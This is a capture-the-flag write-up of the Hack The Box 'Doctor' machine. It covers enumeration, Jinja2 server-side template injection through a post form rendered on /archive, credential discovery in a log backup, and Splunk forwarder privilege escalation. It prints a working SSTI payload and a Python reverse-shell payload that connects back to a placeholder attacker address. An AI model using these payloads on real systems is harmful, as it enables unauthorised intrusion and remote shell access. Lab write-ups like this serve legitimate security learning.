<html>
    <title>Doctor write-up by chriswyte</title>

    <body>
        <h1>User access</h1>
        <h2>Scan</h2>
            <p>As always I started by running nmap on the target IP in search of open ports</p>
            <img src="./img/nmap.PNG"/>
            <p>This is a Linux machine and ports 22, 80 and 8089 are open, this is more than enough. I proceeded by visiting the webserver on port 80
                and running gobuster looking for some useful directories.
            </p>
        
        <h2>Enumeration</h2>
            <p>There's nothing interesting enumerating the webserver's directories, I used a small wordlist, you can try something bigger but I didn't need this anyway.</p>    
            <img src="./img/dirb.PNG"/>

        <h2>Webserver</h2>
            <p>This is the website homepage, there is nothing really interesting except for a domain named <b>doctors.htb</b></p>
            <img src="./img/webserver.PNG" style="max-width: 55%;"/>

        <h2>Virtual host</h2>
            <p>I added <i>doctors.htb</i> into my <b>/etc/hosts</b> file and visited the URL again, now there's <b>actually</b> some interesting: a login page!</p>
            <img src="./img/login.PNG" style="max-width: 55%;"/>
            <p>At this point I thought that I might have found something more useful enumerating the directories. So I ran gobuster once again.</p>
            <img src="./img/dirb-vhost.PNG" style="max-width: 55%;"/>
            <p>Nothing out of the ordinary, apparently. I noticed an <i>archive</i> folder and explored in the URL. Nothing happens but it's quite suspicious.</p>

        <h2>Messing up with login/register page</h2>
            <p>I've tried some simple SQL injection but nothing worked, so I started looking around for other pages, I first checked the register page. Is a simple
                form, I didn't find anything interesting, XSS doesn't work and there are no exploitable file uploads either. At this point I tried to register a new
                user.
            </p>
            <p>At this point you are redirected to the homepage, there is a section when you can submit a post with a title and a content. The post will be shown on
                the homepage.
            </p>
            <img src="./img/board.PNG" style="max-width: 55%;"/>
            <img src="./img/homepage.PNG" style="max-width: 55%;"/>
            <p>I think there might be a vulnerability here somewhere, so I documented myself about how exploiting form submissions and I found an interesting document
                about <b>Server-side Template Injection</b> (SSTI). You can find a nicely documented methodology on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">this repo</a>.
            </p>
            <p>Now we might have a initial foothold on what to do on this machine.</p>

        <h2>Exploiting the template</h2>
            <p>By looking the graph in the previous repo (under the "Methodology" section) there is a nice <a href="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png">flowchart</a> where we notice how we can exploit a template 
                by injecting some values in order to find if they are processed and, at the end, discover which framework is running under the webserver.
            </p>
            <p>The real question now is: <b>where should the expressions be evaluated?</b> Looking around I remembered the <b>archive</b> directory I found while
                enumerating. So I wrote a very simple payload based on the flowchart and checked out the archive directory. Bingo!
            </p>
            <img src="./img/example-payload.PNG" style="max-width: 55%;"/><br>
            <p>This was the result of the expression:</p>
            <img src="./img/example-payload2.PNG" style="max-width: 55%;"/>
            <p>After a couple of attempts following the flowchart I found that the framework under the hood is Jinja2, which is written in Python. This is a very useful information as 
                I'm now aware of the language I have to use if I want to write and run payloads.
            </p>
            <p>What I had to do was to write a python payload in order to open a shell on my machine.</p>
        
        <h2>Writing the payload</h2>
            <p>This is honestly the part where I struggled the most. Mostly because I didn't know the Jinja engine. The first part was to write a python script in order
                to run simple commands, so I tried things like {{import os; os.system("whoami");}} but nothing worked. Since I was stuck on this part I asked help to users 
                on HTB chats and forums for a nudge. I found this piece of conversation to be somehow helpful.
            </p>
            <img src="./img/chat.PNG" style="max-width: 55%;">
            <p>I was actually missing that the script were ran under a backend engine, so I needed to "crawl" into the engine context in order to require the objects and the methods 
                that I needed to run my payload. 
            </p>
            <p>While digging on the internet I found an interesting article about <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">SSTI on Jinja2</a>.
                Here you can find a simple explanation about MRO (which is a way you can exploit in order to run your payload) and the global variables stored into jinja's context.
                In particular we have the <b>request</b> object, from which we can write something like this:   
            </p>
            <table style="border: 1px;">
                <tbody>
                    <tr>{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</tr>
                </tbody>
            </table>
            <p>From this stub we can write the payload we need in order to open a shell on our machine. Some basic socket code did the trick for me. This was the code I used:
            </p>
            <span>
                <small>
                    import socket, os, pty<br>

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a basic socket with ipv4 addresses and TCP protocol<br>
                    s.connect(("x.x.x.x", 4444)) # connect to your local machine using port 4444<br>

                    os.dup2(s.fileno(), 0) # duplicate the socket descriptor on your standard input (0), standard output (1) and standard error (2), in order to display commands output on your terminal<br>
                    os.dup2(s.fileno(), 1)<br>
                    os.dup2(s.fileno(), 2)<br>

                    pty.spawn("/bin/sh") # spawn a shell on your terminal<br>
                </small>
            </span>
            <p>put this code (without the # comments) in the popen() function, calling the script using "python3 -c". This should be your final payload:</p>
            <span>{{request.application.__globals__.__builtins__.__import__('os').popen('python -c '\ import socket, os, pty; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("x.x.x.x", 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn("/bin/sh"); \'').read()}}</span>
        <h2>Shell and privesc</h2>
            <p>Obviously no shell will spawn unless you put your machine on listening on an external port, so I ran netcat in listening mode on port 4444.
                Ran the URL on the /archive endpoint, a shell will spawn on your terminal!
            </p>
            <img src="./img/shell.PNG">
            <p>By enumerating on the machine we can find some useful information. There are 2 users, <i>web</i> and <i>shaun</i>, and we are logged as the first one.
                As web, we can't do anything except looking for interesting files. I followed <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">this guide</a> for basic privesc commands and
                in the /var/log/apache2/ directory I found a file named "backup". By displaying its content on screen I finally found a password!
            </p>
            <img src="./img/user_password.PNG">
            <p>...Or at least it looks like one.
                The first thing I tried is to switch from web to shaun. So I used the <i>su</i> command using the password I found, aaaaand we are in!
                Right now we can search for the user.txt flag, it's located in the /home/shaun directory, so we cat the content and we finally have user.
            </p>
            <img src="./img/user-txt.PNG">

        <h1>From user to root</h1>
            <p>I found this part easier than user, I didn't had much informations, but there was one service that I didn't even checked: <b>the splunk service on port 8089</b>.
                Since I didn't found nothing useful by navigating on the service via browser, I searched on the internet for a privesc tool and I found <a href="https://github.com/cnotin/SplunkWhisperer2">this one</a>
                that exploits misconfigurations on the service. Before using this tool, I suggest to read <a href="https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2">here</a> in order
                to fully comprehend the vulnerability you are exploiting. 
            </p>
            <p>By the way, in order to use this tool, I cloned the repository, opened another terminal window and ran nc on port 9999 and used the PySplunkWhisperer_remote script following
                the usage instructions. The script did everything for me, and on the netcat window I had a shell as root! 
            </p>
            <img src="./img/root_shell.PNG"><br><br>
            <img src="./img/root_shell2.PNG">

    </body>
</html>